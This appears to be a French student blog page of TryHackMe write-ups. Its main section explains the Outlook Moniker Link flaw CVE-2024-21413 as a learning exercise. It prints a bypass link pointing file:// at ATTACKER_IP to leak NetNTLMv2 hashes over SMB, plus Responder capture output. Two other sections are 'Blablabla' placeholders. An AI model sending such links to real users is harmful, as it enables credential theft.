<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Exploitation Basics</title>
        <!-- Favicon-->
        <link rel="icon" type="image/x-icon" href="../../../assets/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
        <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/css?family=Roboto+Slab:400,100,300,700" rel="stylesheet" type="text/css" />
        <!-- Core theme CSS (includes Bootstrap)-->
        <link href="../../../css/styles.css" rel="stylesheet" />
        <link href="../../css/app.css" rel="stylesheet" />
    </head>
    <body id="page-top">
        <!-- Navigation-->
        <nav class="navbar navbar-expand-lg navbar-dark fixed-top" id="mainNav">
            <div class="container">
                <a class="navbar-brand" href="#page-top"><img src="../../../assets/img/navbar-logo.webp" alt="..." /></a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                    Menu
                    <i class="fas fa-bars ms-1"></i>
                </button>
                <div class="collapse navbar-collapse" id="navbarResponsive">
                    <ul class="navbar-nav text-uppercase ms-auto py-4 py-lg-0">
                        <li class="nav-item"><a class="nav-link" href="#services">Services</a></li>
                        <li class="nav-item"><a class="nav-link" href="#portfolio">Portfolio</a></li>
                        <li class="nav-item"><a class="nav-link" href="#about">About</a></li>
                        <li class="nav-item"><a class="nav-link" href="#team">Team</a></li>
                        <li class="nav-item"><a class="nav-link" href="#contact">Contact</a></li>
                    </ul>
                </div>
            </div>
        </nav>
        <!-- Portfolio Grid-->
        <section class="page-section bg-light" id="portfolio">
            <div class="container">
                <div class="text-center">
                    <h2 class="section-heading text-uppercase">Articles</h2>
                    <h3 class="section-subheading text-muted">Vous retrouverez les articles de blog portant sur le module Cyber Security 101 de TryHackMe.</h3>
                </div>
                <h1>Exploitation Basics</h1>
                <div class="row">
                    <div class="col-lg-4 col-sm-6 mb-4">
                        <!-- Portfolio item 1-->
                        <div class="portfolio-item">
                            <a class="portfolio-link" data-bs-toggle="modal" href="#portfolioModal1">
                                <div class="portfolio-hover">
                                    <div class="portfolio-hover-content"><i class="fas fa-plus fa-3x"></i></div>
                                </div>
                                <img class="img-fluid" src="../../../assets/img/rooms/moniker_link.webp" alt="..." />
                            </a>
                            <div class="portfolio-caption">
                                <div class="portfolio-caption-heading">Moniker Link</div>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6 mb-4">
                        <!-- Portfolio item 2-->
                        <div class="portfolio-item">
                            <a class="portfolio-link" data-bs-toggle="modal" href="#portfolioModal2">
                                <div class="portfolio-hover">
                                    <div class="portfolio-hover-content"><i class="fas fa-plus fa-3x"></i></div>
                                </div>
                                <img class="img-fluid" src="../../../assets/img/rooms/metasploit_introduction.webp" alt="..." />
                            </a>
                            <div class="portfolio-caption">
                                <div class="portfolio-caption-heading">Metasploit: Introduction</div>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6 mb-4">
                        <!-- Portfolio item 3-->
                        <div class="portfolio-item">
                            <a class="portfolio-link" data-bs-toggle="modal" href="#portfolioModal3">
                                <div class="portfolio-hover">
                                    <div class="portfolio-hover-content"><i class="fas fa-plus fa-3x"></i></div>
                                </div>
                                <img class="img-fluid" src="../../../assets/img/rooms/blue.webp" alt="..." />
                            </a>
                            <div class="portfolio-caption">
                                <div class="portfolio-caption-heading">Blue</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- Footer-->
        <footer class="footer py-4">
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-lg-4 text-lg-start">Copyright &copy; SAE_GRP_1 2025</div>
                    <div class="col-lg-4 my-3 my-lg-0">
                    </div>
                    <div class="col-lg-4 text-lg-end">
                        <a class="link-dark text-decoration-none me-3" href="#!">Confidentialité</a>
                        <a class="link-dark text-decoration-none me-3">|</a>
                        <a class="link-dark text-decoration-none" href="#!">Conditions d'utilisations</a>
                    </div>
                </div>
            </div>
        </footer>
        <!-- Portfolio Modals-->
        <!-- Portfolio item 1 modal popup-->
        <div class="portfolio-modal modal fade" id="portfolioModal1" tabindex="-1" role="dialog" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                  <div class="close-modal" data-bs-dismiss="modal"><img src="../../../assets/img/close-icon.svg" alt="Close modal" /></div>
                    <div class="container">
                        <div class="row justify-content-center">
                            <div class="col-lg-8">
                                <h1>Room TryHackMe - Moniker Link (CVE-2024-21413)</h1>

                                <h2>Contexte</h2>
                                <p>
                                    Cette room TryHackMe est centrée sur l’exploitation de la faille critique CVE-2024-21413. Cette vulnérabilité affecte Microsoft Outlook et permet à un attaquant de forcer l’ouverture d’un fichier distant via un lien spécial (moniker), contournant la Protected View. Le but de la room est de comprendre le fonctionnement des monikers, comment les détourner, et de capturer les identifiants de la victime via une attaque SMB.
                                </p>

                                <h2>Présentation de la CVE</h2>
                                <ul>
                                    <li>Date de publication : 13 février 2024</li>
                                    <li>Score CVSS : 9.8 (critique)</li>
                                    <li>Impact : Exécution de code à distance / fuite de credentials</li>
                                    <li>Exploitation : Faible complexité</li>
                                    <li>Produits impactés : Microsoft Office 2016, 2019, 2021, Microsoft 365</li>
                                </ul>

                                <h2>Les URL Monikers</h2>
                                <p>
                                    Les monikers sont utilisés pour accéder à des ressources externes via des protocoles comme <code>file://</code>, <code>ftp://</code> ou encore <code>ms-word://</code>. Ils sont intégrés dans les applications Microsoft (Outlook, Word…) et permettent de charger des objets COM. Cette technologie peut être abusée pour forcer l’ouverture de fichiers distants automatiquement.
                                </p>
                                <img src="https://example.com/image-moniker.png" alt="Exemple de moniker" style="width:60%; margin: 1em 0;" />

                                <h3>Exemples de Monikers</h3>
                                <ul>
                                    <li><code>http://</code> – Accès web</li>
                                    <li><code>file://</code> – Accès à un fichier distant</li>
                                    <li><code>ftp://</code> – Fichier sur un serveur FTP</li>
                                    <li><code>ms-word://</code> – Chargement via Word</li>
                                    <li><code>outlook://</code> – Référence à un élément Outlook</li>
                                </ul>

                                <h2>La Protected View</h2>
                                <p>
                                    Outlook protège l’utilisateur en ouvrant les pièces jointes dans un mode sécurisé. Toutefois, ce mécanisme peut être contourné via des monikers malformés utilisant un caractère spécial.
                                </p>

                                <h3>Lien bloqué par la Protected View</h3>
                                <pre><code>&lt;a href="file://ATTACKER_IP/test"&gt;Click me&lt;/a&gt;</code></pre>

                                <h3>Lien permettant de bypass</h3>
                                <pre><code>&lt;a href="file://ATTACKER_IP/test!exploit"&gt;Click me&lt;/a&gt;</code></pre>

                                <p>
                                    Ce lien déclenche une connexion SMB vers la machine de l’attaquant, permettant la capture d’un hash NetNTLMv2.
                                </p>
                                <img src="https://example.com/image-link-exploit.png" alt="Lien malveillant" style="width:60%; margin: 1em 0;" />

                                <h2>Exploitation</h2>
                                <p>
                                    Pour exploiter la faille, un script Python est utilisé pour envoyer un e-mail avec le lien malveillant. Il faut modifier deux éléments :
                                </p>
                                <ul>
                                    <li>Mettre votre propre IP dans le lien Moniker</li>
                                    <li>Utiliser l’adresse SMTP de la machine cible</li>
                                </ul>
                                <img src="https://example.com/image-script-mail.png" alt="Script d'envoi d'e-mail" style="width:60%; margin: 1em 0;" />

                                <p>
                                    Une fois le mail reçu, si l’utilisateur clique sur le lien, sa machine tente d’accéder au fichier, ce qui déclenche une requête SMB interceptée par Responder ou Inveigh.
                                </p>

                                <h2>Analyse de la réponse Responder</h2>
                                <p>
                                    Lors de la connexion SMB, Responder capture les informations d’identification :
                                </p>
                                <pre>
                                    [SMB] NTLMv2-SSP Client   : ::ffff:10.10.97.238
                                    [SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
                                    [SMB] NTLMv2-SSP Hash     : tryhackme::THM-MONIKERLINK:86a73f...
                                </pre>
                                <img src="https://example.com/image-responder.png" alt="Capture SMB via Responder" style="width:60%; margin: 1em 0;" />

                                <p>
                                    Ce hash peut ensuite être utilisé dans une attaque Pass-the-Hash ou craqué avec Hashcat ou John the Ripper.
                                </p>

                                <h2>Conclusion</h2>
                                <p>
                                    Cette room met en lumière la facilité avec laquelle un attaquant peut détourner une fonctionnalité légitime (monikers) pour obtenir des credentials, même sans interaction poussée de la victime. CVE-2024-21413 démontre une fois de plus la dangerosité des protocoles hérités comme SMB dans un environnement non cloisonné.
                                </p>
                                <h3>Vidéo explicative</h3>
                                    <div style="text-align: center;">
                                        <iframe width="560" height="315" src="https://www.youtube.com/embed/6oXj8GPT9Zg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Portfolio item 2 modal popup-->
        <div class="portfolio-modal modal fade" id="portfolioModal2" tabindex="-1" role="dialog" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                  <div class="close-modal" data-bs-dismiss="modal"><img src="../../../assets/img/close-icon.svg" alt="Close modal" /></div>
                    <div class="container">
                        <div class="row justify-content-center">
                            <div class="col-lg-8">
                                <div class="modal-body">
                                    <!-- Project details-->
                                    <h2 class="text-uppercase">Metasploit: Introduction</h2>
                                    <p class="item-intro text-muted"><a href="https://tryhackme.com/paths" target="_blank">Lien vers la box</a></p>
                                    <img class="img-fluid d-block mx-auto" src="../../../assets/img/rooms/metasploit_introduction.webp" alt="..." />
                                        <h2>Description:</h2>
                                        <p>Blablabla</p>
                                        <h4>Contexte:</h4>                            
                                        <p>Blablabla</p>
                                        <h1>Ce qu'on a compris:</h1>
                                        <p>Blablabla</p>
                                        <h1>Video de présentation:</h1>
                                        <video width="320" height="240" controls>
                                            <source src="../../../assets/vid/nggyu.mp4" type="video/mp4">
                                        </video>
                                    <button class="btn btn-primary btn-xl text-uppercase" data-bs-dismiss="modal" type="button">
                                        <i class="fas fa-xmark me-1"></i>
                                        Fermer le projet
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Portfolio item 3 modal popup-->
        <div class="portfolio-modal modal fade" id="portfolioModal3" tabindex="-1" role="dialog" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                  <div class="close-modal" data-bs-dismiss="modal"><img src="../../../assets/img/close-icon.svg" alt="Close modal" /></div>
                    <div class="container">
                        <div class="row justify-content-center">
                            <div class="col-lg-8">
                                <div class="modal-body">
                                    <!-- Project details-->
                                    <h2 class="text-uppercase">Blue</h2>
                                    <p class="item-intro text-muted"><a href="https://tryhackme.com/paths" target="_blank">Lien vers la box</a></p>
                                    <img class="img-fluid d-block mx-auto" src="../../../assets/img/rooms/blue.webp" alt="..." />
                                        <h2>Description:</h2>
                                        <p>Blablabla</p>
                                        <h4>Contexte:</h4>                            
                                        <p>Blablabla</p>
                                        <h1>Ce qu'on a compris:</h1>
                                        <p>Blablabla</p>
                                        <h1>Video de présentation:</h1>
                                        <center style="padding-bottom: 2rem;">
                                            <video width="320" height="240" controls>
                                                <source src="../../../assets/vid/nggyu.mp4" type="video/mp4">
                                            </video>
                                        </center>
                                    <button class="btn btn-primary btn-xl text-uppercase" data-bs-dismiss="modal" type="button">
                                        <i class="fas fa-xmark me-1"></i>
                                        Fermer le projet
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Bootstrap core JS-->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
        <!-- Core theme JS-->
        <script src="../../js/scripts.js"></script>
        <!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *-->
        <!-- * *                               SB Forms JS                               * *-->
        <!-- * * Activate your form at https://startbootstrap.com/solution/contact-forms * *-->
        <!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *-->
        <script src="https://cdn.startbootstrap.com/sb-forms-latest.js"></script>
    </body>
</html>